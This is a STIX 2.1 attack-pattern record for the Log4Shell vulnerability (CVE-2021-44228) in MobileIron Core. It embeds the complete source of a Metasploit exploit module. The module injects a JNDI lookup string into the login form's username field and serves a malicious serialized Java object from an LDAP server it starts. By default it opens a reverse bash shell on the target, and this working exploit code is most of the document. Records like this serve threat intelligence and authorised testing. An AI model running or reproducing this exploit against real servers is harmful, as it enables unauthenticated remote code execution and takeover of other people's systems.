{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a3c6884c-2c47-40fb-a3de-9cb112eeaec7",
    "created": "2024-08-14T17:03:32.157911Z",
    "modified": "2024-08-14T17:03:32.157916Z",
    "name": "MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)",
    "description": " MobileIron Core is affected by the Log4Shell vulnerability whereby a JNDI string sent to the server will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the tomcat user.  This module will start an LDAP server that the target will need to connect to. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/mobileiron_core_log4shell.rb",
            "external_id": "mobileiron_core_log4shell.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44228"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://forums.ivanti.com/s/article/Security-Bulletin-CVE-2021-44228-Remote-code-injection-in-Log4j?language=en_US"
        },
        {
            "source_name": "reference",
            "url": "https://www.mandiant.com/resources/mobileiron-log4shell-exploitation"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Log4Shell\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)',\n      'Description' => %q{\n        MobileIron Core is affected by the Log4Shell vulnerability whereby a JNDI string sent to the server\n        will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS\n        command execution in the context of the tomcat user.\n\n        This module will start an LDAP server that the target will need to connect to.\n      },\n      'Author' => [\n        'Spencer McIntyre', # JNDI/LDAP lib stuff\n        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff\n        'rwincey', # discovered log4shell vector in MobileIron\n        'jbaines-r7' # wrote this module\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis'],\n        [ 'URL', 'https://forums.ivanti.com/s/article/Security-Bulletin-CVE-2021-44228-Remote-code-injection-in-Log4j?language=en_US' ],\n        [ 'URL', 'https://www.mandiant.com/resources/mobileiron-log4shell-exploitation' ]\n      ],\n      'DisclosureDate' => '2021-12-12',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 443,\n        'SSL' => true,\n        'SRVPORT' => 389,\n        'WfsDelay' => 30\n      },\n      'Targets' => [\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION],\n        'RelatedModules' => [\n          'auxiliary/scanner/http/log4shell_scanner',\n          'exploit/multi/http/log4shell_header_injection'\n        ]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def wait_until(&block)\n    datastore['WfsDelay'].times do\n      break if block.call\n\n      sleep(1)\n    end\n  end\n\n  def check\n    validate_configuration!\n\n    vprint_status('Attempting to trigger the jndi callback...')\n\n    start_service\n    res = trigger\n    return Exploit::CheckCode::Unknown('No HTTP response was received.') if res.nil?\n\n    wait_until { @search_received }\n    @search_received ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Unknown('No LDAP search query was received.')\n  ensure\n    cleanup_service\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    return [] unless @exploiting\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('CommonsBeanutils1')\n  end\n\n  def trigger\n    @search_received = false\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'mifs', 'j_spring_security_check'),\n      'headers' => {\n        'Referer' => \"https://#{rhost}#{normalize_uri(target_uri, 'mifs', 'user', 'login.jsp')}\"\n      },\n      'encode' => false,\n      'vars_post' => {\n        'j_username' => log4j_jndi_string,\n        'j_password' => Rex::Text.rand_text_alphanumeric(8),\n        'logincontext' => 'employee'\n      }\n    )\n  end\n\n  def exploit\n    validate_configuration!\n    @exploiting = true\n    start_service\n    res = trigger\n    fail_with(Failure::Unreachable, 'Failed to trigger the vulnerability') if res.nil?\n    fail_with(Failure::UnexpectedReply, 'The server replied to the trigger in an unexpected way') unless res.code == 302\n\n    wait_until { @search_received && (!handler_enabled? || session_created?) }\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-12-12",
    "x_mitre_platforms": [
        "unix'"
    ]
}